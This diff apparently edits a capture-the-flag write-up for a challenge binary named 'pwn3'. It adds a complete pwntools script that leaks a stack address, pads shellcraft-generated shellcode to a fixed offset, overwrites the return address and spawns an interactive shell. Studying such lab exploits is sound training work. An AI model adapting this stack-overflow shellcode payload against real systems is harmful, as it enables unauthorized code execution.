@@ -243,6 +243,61 @@ mark
 $  
 ```
 
+## Edited: 
+Here's a modified exploit that will genenrate the shellcode using shellcraft 😉
+
+```
+from pwn import *
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+# Set up pwntools for the correct architecture
+exe = './pwn3'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Enable verbose logging so we can see exactly what is being sent (info/debug)
+context.log_level = 'debug'
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Pass in pattern_size, get back EIP/RIP offset
+offset = 0x12e
+print("Offset at: " +hex(offset))
+# Start program
+io = start()
+
+# Get the stack address (where out navigation commands will go)
+print(io.recvuntil('Take this, you might need it on your journey'))
+leak = io.recvline()
+addr = leak.strip('!\n')
+stack_addr = int(addr, 16)
+print("Stack address at: " +hex(stack_addr))
+
+
+shellcode = asm(shellcraft.sh())
+padding = asm('nop') * (offset - len(shellcode))
+
+# Build the payload
+payload = flat([
+    shellcode,
+    padding,
+    stack_addr
+])
+
+io.sendline(payload)
+
+# spawn a shell
+io.interactive()
+```
 And we're done
 
 <br> <br>
